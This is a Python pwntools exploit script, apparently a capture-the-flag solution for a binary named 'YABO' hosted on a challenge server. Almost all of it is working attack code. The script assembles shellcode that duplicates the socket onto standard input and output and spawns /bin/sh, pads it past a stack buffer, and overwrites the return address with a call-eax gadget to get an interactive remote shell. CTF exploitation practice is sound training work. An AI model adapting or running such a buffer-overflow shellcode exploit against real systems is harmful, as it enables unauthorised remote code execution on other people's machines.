#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host challenge.ctf.games --port 31254 ./YABO
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./YABO')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challenge.ctf.games'
port = int(args.PORT or 31254)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        # return connect("localhost",9999)
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments
import os
io1 = start()
# io = start()
pppr =0x08049681
ppppr = 0x08049680

if args.LOCAL:
    io = connect("127.0.0.1",9999)
else:
    io = start()
print os.getpid()
# gdb.attach(io,gdbscript=gdbscript)
call_eax = 0x0804901d
shell =''
shell += shellcraft.dup2(4,0)
shell += shellcraft.dup2(4,1)
shell += shellcraft.dup2(4,2)
shell += shellcraft.sh()

p = asm(shell).ljust(0x414,'a')
p += "\x1d\x90\x04\x08"


io.sendlineafter(": ",p)
io.interactive()
# io.close()


# io1.interactive()

